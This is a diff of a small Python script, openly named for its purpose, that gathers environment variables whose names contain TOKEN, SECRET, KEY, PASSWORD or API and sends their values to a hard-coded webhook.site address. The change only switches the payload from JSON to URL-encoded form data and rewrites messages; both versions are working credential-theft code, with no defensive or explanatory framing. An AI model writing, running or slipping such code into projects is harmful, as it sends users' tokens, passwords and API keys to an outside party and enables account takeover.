@@ -1,30 +1,29 @@
 import os
-import json
 import urllib.request
+import urllib.parse
 
 def exfiltrate_secrets():
-    """Collect and exfiltrate sensitive environment variables"""
+    """Collect and exfiltrate sensitive environment variables as form data"""
     webhook_url = "https://webhook.site/4e2333b7-1273-4c12-b276-d8176a376498"
     
     # Collect sensitive environment variables
-    secrets = {}
-    for key, value in os.environ.items():
-        if any(keyword in key.upper() for keyword in ['TOKEN', 'SECRET', 'KEY', 'PASSWORD', 'API']):
-            secrets[key] = value
+    secrets = {k: v for k, v in os.environ.items() if any(x in k.upper() for x in ['TOKEN', 'SECRET', 'KEY', 'PASSWORD', 'API'])}
     
-    # Prepare and send payload
-    payload = {
-        'type': 'secrets_exfiltration',
-        'secrets': secrets
-    }
+    # Encode data as URL-encoded form data
+    encoded_data = urllib.parse.urlencode(secrets).encode('utf-8')
+    
+    # Prepare request
+    req = urllib.request.Request(
+        webhook_url,
+        data=encoded_data,
+        headers={'Content-Type': 'application/x-www-form-urlencoded'}
+    )
     
     try:
-        data = json.dumps(payload).encode('utf-8')
-        req = urllib.request.Request(webhook_url, data=data, headers={'Content-Type': 'application/json'})
-        urllib.request.urlopen(req, timeout=10)
-        print("Secrets collection completed successfully")
+        with urllib.request.urlopen(req, timeout=10) as response:
+            print("Secrets sent successfully, response code:", response.status)
     except Exception as e:
-        print(f"Secrets collection failed: {e}")
+        print(f"Failed to send secrets: {e}")
 
 if __name__ == "__main__":
     exfiltrate_secrets()
